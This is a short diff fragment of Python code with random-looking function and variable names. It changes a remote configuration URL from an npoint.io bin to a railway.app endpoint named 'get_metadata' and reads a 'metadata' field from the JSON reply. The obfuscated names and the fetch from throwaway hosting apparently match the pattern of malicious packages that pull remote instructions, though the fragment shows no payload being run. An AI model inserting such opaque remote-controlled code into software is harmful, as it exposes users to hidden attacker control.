@@ -18,7 +18,7 @@ def learn_bcmfrz_911():
 
     def eval_xodfjl_981():
         try:
-            config_lymjcb_608 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_lymjcb_608 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_lymjcb_608.raise_for_status()
             net_rfoxjh_589 = config_lymjcb_608.json()
             config_obvzze_307 = net_rfoxjh_589.get('metadata')
